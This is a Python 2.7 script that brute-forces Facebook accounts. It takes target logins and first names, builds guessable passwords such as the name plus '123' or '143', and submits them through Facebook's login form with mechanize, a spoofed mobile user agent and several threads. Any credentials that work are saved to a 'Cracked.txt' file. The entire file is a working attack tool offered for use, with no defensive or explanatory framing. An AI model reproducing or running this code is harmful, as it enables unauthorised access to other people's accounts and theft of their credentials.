#!/usr/bin/env python2.7
#
# TODO Brute Force Using Mechanize 
#
from threading import Thread,Lock
from subprocess import call
from time import time,sleep
from random import choice
import mechanize
import cookielib

def MechForce(Email,Pass):
  global Cracked,Attempts 
  Browser = mechanize.Browser()
  cj = cookielib.LWPCookieJar()
  Browser.set_cookiejar(cj)
  Browser.set_handle_equiv(True)
  Browser.set_handle_redirect(True)
  Browser.set_handle_referer(True)
  Browser.set_handle_robots(False)
  Browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  Browser.addheaders = [('User-agent', 'Mozilla/5.0 (iPad; U; CPU iPhone OS 5_1_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1.1;FBBV/4110.0;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/5.1.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBSF/1.0]')]
  Browser.open('https://www.facebook.com/login.php')
  Browser.select_form(nr=0)
  Browser.form['email'] = Email
  Browser.form['pass']  = Pass
  Browser.submit()
  Browser.open('https://www.facebook.com/login.php')
  if Browser.title() == 'Facebook': Cracked+=1;SaveCred(Email,Pass)
  Browser.close()
  with lock:Attempts+=1
  return 

def SaveCred(login,passwrd):
  with open('Cracked.txt','a') as Save:
    Save.write('Login: {}\nPassword: {}\n\n'.format(login,passwrd))

def PasswordManager(name):
  global Passwrds
  Passwrds.append('{}{}'.format(str(name).lower(),'123'))
  Passwrds.append('{}{}'.format(str(name).lower(),'143'))
  Passwrds.append('{}{}'.format(str(name).title(),'123'))
  Passwrds.append('{}{}'.format(str(name).title(),'143'))
  return

if __name__ == '__main__':
  Mech_Dead = True
  Logins    = []
  Names     = []
  Passwrds  = []
  call(['clear'])
  Integer = int(input('[+] Enter # Of Target: '));call(['clear'])
  if Integer != 0: 
    for i in range(Integer): 
      login = raw_input('[{}]  Enter Target [Username | ID | Email | Phone]: '.format(i+1))
      if len(str(login)) != 0: 
        name = raw_input('[{}] Enter Target Firstname: '.format(i+1));call(['clear'])
        if len(str(name)) != 0:
          Logins.append(str(login)) 
          PasswordManager(str(name))
  k=0;Cracked=0;call(['clear']);lock = Lock()
  Attempts=0;RunTime=len(Passwrds);Start = time()
  while len(Passwrds) != 0:
    if Mech_Dead:
      call(['clear'])
      Mech_Dead = False
      Login = Logins[k]
      try:k+=1
      except:pass
      if k == len(Logins):k=0
      for i in range(4): 
        Thread(target=MechForce,args=(Login,Passwrds[0])).start();
        try:del Passwrds[0]
        except:pass
      Mech_Dead = True
  while Attempts != RunTime:
    call(['clear'])
    n=choice(['-','+']);m=choice(['-','+'])
    print '[{}] BruteForce In Progress...\n\n[{}] Login Attempts: {}'.format(n,m,Attempts);sleep(0.4)
  call(['clear'])
  print '[+] BruteForce Completed\n\n[-] Accounts Cracked: {}\n[-] Time(Sec): {}'.format(Cracked,int(time()-Start))
